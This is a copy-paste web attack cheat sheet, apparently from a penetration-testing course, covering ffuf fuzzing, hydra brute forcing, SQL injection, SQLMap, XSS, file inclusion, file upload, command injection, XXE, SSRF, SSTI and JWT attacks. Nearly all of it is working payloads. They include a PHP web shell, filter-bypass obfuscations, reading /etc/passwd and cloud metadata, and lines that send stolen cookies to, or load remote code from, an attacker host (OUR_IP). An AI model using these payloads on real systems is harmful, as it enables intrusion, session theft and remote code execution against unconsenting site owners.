# Web Attacks Cheat Sheet

Flat copy-paste reference across the web modules. Explanations: SQLi `17`, SQLMap `18`, XSS `19`, File Inclusion `20`, File Upload `21`, Command Injection `22`, Web Attacks `23`, ffuf `15`, Login Brute `16`.
Placeholders: `<TARGET>`/`t`, `<LHOST>`/`OUR_IP`, `<PORT>`.

## Content / parameter discovery (ffuf)
```bash
ffuf -w wordlist.txt:FUZZ -u http://t/FUZZ                                   # dirs/files
ffuf -w subdomains.txt:FUZZ -u http://t/ -H "Host: FUZZ.t" -fs <baseline>    # vhosts
ffuf -w params.txt:FUZZ -u 'http://t/index.php?FUZZ=value' -fs <baseline>     # hidden params
ffuf -w values.txt:FUZZ -u 'http://t/?id=FUZZ' -fs <baseline>                 # value fuzz
# -fs filter size · -fc filter code · -mc match code · -e .php,.html extensions · -recursion
```

## Login brute forcing
```bash
hydra -L users.txt -P pass.txt <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l admin -P rockyou.txt <TARGET> ssh
hydra -L users.txt -P pass.txt <TARGET> ftp
```

## SQL injection (manual — module 17)
```sql
'   "   `                                   -- break syntax to detect
admin'-- -                                  -- auth bypass (comment out password check)
' OR '1'='1'-- -
' ORDER BY 1-- -                            -- find column count (increment)
' UNION SELECT 1,@@version,database()-- -   -- fingerprint
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- -   -- 0x3a = ':'
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -                   -- FILE priv → read
-- INTO OUTFILE writes a webshell to webroot (check @@secure_file_priv)
```

## SQLMap (module 18)
```bash
sqlmap -r req.txt -p <param> --batch         # saved Burp request = easiest
sqlmap -u "http://t/?id=1" --batch
sqlmap ... --level=5 --risk=3 --dbms MySQL
sqlmap ... --dbs / -D db --tables / -D db -T users --columns / -D db -T users --dump
sqlmap ... --random-agent --tamper=between   # beat basic filters (--list-tampers)
sqlmap ... --is-dba --file-read="/etc/passwd" --os-shell    # DBA → RCE
```

## XSS (module 19)
```html
<script>alert(window.origin)</script>        <!-- PoC -->
<img src=x onerror=alert(document.cookie)>    <!-- when <script> filtered -->
"><script src=http://OUR_IP/x></script>       <!-- break out of attribute + remote include -->
<script>new Image().src='http://OUR_IP/?c='+document.cookie</script>   <!-- cookie steal (stored) -->
# receiver: python3 -m http.server 80  /  sudo php -S 0.0.0.0:80 ; replay stolen PHPSESSID in DevTools
# discovery: python xsstrike.py -u "http://t/?x=test"   ;  HttpOnly flag kills cookie theft
```

## File inclusion / LFI–RFI (module 20)
```text
?lang=/etc/passwd                                    # direct
?lang=../../../../etc/passwd                         # traversal
?lang=....//....//etc/passwd                         # non-recursive ../ filter bypass
?lang=%2e%2e%2f...                                   # URL-encode ; double %252e
?lang=php://filter/convert.base64-encode/resource=config.php    # read PHP source (base64 → decode)
?lang=data://text/plain;base64,<b64-php>             # RCE (needs allow_url_include)
?lang=php://input   (POST the PHP)  ;  ?lang=expect://id   (expect ext)
?lang=http://OUR_IP/shell.php                        # RFI (test http://127.0.0.1 first)
# log poisoning: poison User-Agent with PHP → include /var/log/apache2/access.log
# upload+LFI: GIF89a; + PHP → upload .gif → include it
```

## File upload (module 21)
```php
<?php system($_REQUEST['cmd']); ?>            // → /uploads/shell.php?cmd=id
```
```text
# bypass order: client-side → blacklist (.phtml/.php5/.pHp) → whitelist (shell.jpg.php / shell.php.jpg)
#   → char injection (shell.php%00.jpg, :) → Content-Type: image/png → magic bytes (prepend GIF8)
# limited uploads: SVG → XSS/XXE ; exiftool -Comment='"><img src=1 onerror=alert(1)>' HTB.jpg
```

## Command injection (module 22)
```bash
127.0.0.1; id        127.0.0.1 && whoami        | ; & && || `cmd` $(cmd)       # operators
cat${IFS}/etc/passwd    {cat,/etc/passwd}    cat%09/etc/passwd                  # space bypass
${PATH:0:1} → /     ${LS_COLORS:10:1} → ;                                       # char from env
w'h'o'am'i          $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")      $(rev<<<'imaohw')     # char/case/reverse
bash<<<$(base64 -d<<<Y2F0...)                                                   # base64 → bash
# Burp Intruder cluster bomb: P1=separators (no URL-enc), P2=obfuscated cmds (URL-enc)
```

## Advanced web (module 23)
```bash
# HTTP verb tampering:
curl -i -X OPTIONS http://t/admin/          # list methods ; try HEAD/GET to skip POST-only auth
# IDOR:
curl "http://t/documents.php?uid=3"
curl -X PUT -d '{"uid":2}' http://t/api/profile/2      # edit another user
# XXE:
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
# SSRF:
http://169.254.169.254/latest/meta-data/    # AWS creds ; file:/// ; gopher://
# SSTI: {{7*7}} → 49 then  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}  (Jinja2)
# JWT: jwt_tool <JWT> -S none        # alg:none / crack weak HMAC
# mass assignment: add &confirmed=1 / admin=true to the request body
```

> Web→RCE ladder: find the sink → confirm with a benign probe (`id`, `alert(window.origin)`, `/etc/passwd`) → escalate (filter bypass, source read, shell). SSRF→cloud-metadata and SSTI→RCE are the heaviest real-world hitters.
